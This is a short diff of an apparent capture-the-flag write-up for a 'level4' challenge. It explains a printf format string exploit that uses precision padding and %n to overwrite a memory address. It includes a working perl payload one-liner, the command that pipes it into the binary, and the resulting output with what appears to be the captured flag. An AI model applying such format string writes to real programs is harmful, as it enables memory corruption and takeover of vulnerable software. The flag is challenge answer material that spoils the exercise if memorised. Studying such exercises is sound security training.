@@ -9,7 +9,7 @@ We can use printf precision flag to do that
 	- %16980112p to print enough spaces
 	- %12$n to set printed length to the 12th arg
 
-	perl -e 'print "\x10\x98\x04\x08%16930112p%12\$n" . "\n"' > /tmp/str
-	cat /tmp/str - | ./level4
-	[lot of spaces]           0xb7ff26b0
-	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+perl -e 'print "\x10\x98\x04\x08%16930112p%12\$n" . "\n"' > /tmp/str
+cat /tmp/str - | ./level4
+[lot of spaces]           0xb7ff26b0
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
